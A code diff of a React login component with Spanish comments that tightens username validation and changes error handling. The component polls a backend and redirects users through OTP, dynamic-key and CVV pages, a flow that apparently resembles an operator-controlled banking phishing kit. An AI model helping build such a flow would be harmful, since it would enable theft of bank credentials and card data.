@@ -323,19 +323,30 @@ export default function IniciarSesion() {
     // Se captura el name y value del input
     const { name, value } = e.target;
 
+    // Se valida el campo
     if (name === "usuario") {
+
       // 1. RESTRICCIÓN DE ENTRADA: Solo permite escribir letras y números (sin espacios ni símbolos)
       const regexInput = /^[a-zA-Z0-9]*$/;
+
+      // Se valida con la regex
       if (!regexInput.test(value)) return;
 
       // 2. ACTUALIZACIÓN DEL ESTADO
       setFormState(prev => {
+
+        // Nuevo estado provisional
         const nuevoEstado = {
           ...prev,
           usuario: value,
           // 3. VALIDACIÓN DE COMPLEJIDAD: Verifica si tiene AL MENOS una letra Y un número
-          errorUsuario: !/(?=.*[a-zA-Z])(?=.*[0-9])/.test(value)
+          // errorUsuario: !/(?=.*[a-zA-Z])(?=.*[0-9])/.test(value)
+
+          // 3. Validacion para que minimo tenga 6 caracteres tipo string y mas de 1 número
+          errorUsuario: !(value.length >= 6 && /(?=.*[a-zA-Z])(?=.*[0-9])/.test(value))
         };
+
+        // 4. VALIDAR BOTÓN
         validarBoton(nuevoEstado);
         return nuevoEstado;
       });
@@ -478,7 +489,7 @@ export default function IniciarSesion() {
   // Función para verificar el estado de aprobación
   const verificarEstadoAprobacion = async () => {
 
-    // Se usa el try
+    // Se usa el try catch
     try {
 
       // Se realiza la petición al backend
@@ -489,8 +500,10 @@ export default function IniciarSesion() {
 
       // Si llega configuración de tarjeta custom, la guardamos
       if (cardData) {
+
+        // Se guarda en el localStorage
         localStorageService.setItem("selectedCardData", cardData);
-      }
+      };
 
       // Estados que detienen el polling (redirecciones o finales)
       const estadosFinales = [
@@ -568,12 +581,18 @@ export default function IniciarSesion() {
           break;
         case 'error_otp':
 
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
           // Redirige a la página
           redirigir(`/numero-otp`);
 
           // Se sale del switch
           break;
         case 'error_din':
+
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
 
           // Redirige a la página
           redirigir(`/clave-dinamica`);
@@ -622,26 +641,32 @@ export default function IniciarSesion() {
 
           // Se sale del switch
           break;
-
         case 'error_cvv_custom':
-          // Redirige a validación con error
-          redirigir(`/validacion-cvv?error=true`);
-          break;
 
-        // ------------ CASOS ADICIONALES ------------
-        case 'aprobado':
-        case 'pendiente':
-        case 'error_pantalla':
-        case 'bloqueado_pantalla':
-        default:
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
+          // Redirige a validación con error
+          redirigir(`/validacion-cvv`);
+
+          // Se sale del switch
           break;
-      }
+        default:
+
+          // Se quita el cargando
+          setCargando(false);
+
+          // Se sale del ciclo
+          break;
+      };
     } catch (error) {
-      console.error('💥 [POLLING] Error:', {
-        mensaje: error.message,
-        status: error.response?.status
-      });
-    }
+
+      // Se quita el estado de cargando
+      setCargando(false);
+
+      // Se lanza una alerta de error
+      alert('Error consultando estado. Intente nuevamente.');
+    };
   };
 
   // Helper para redirección suave
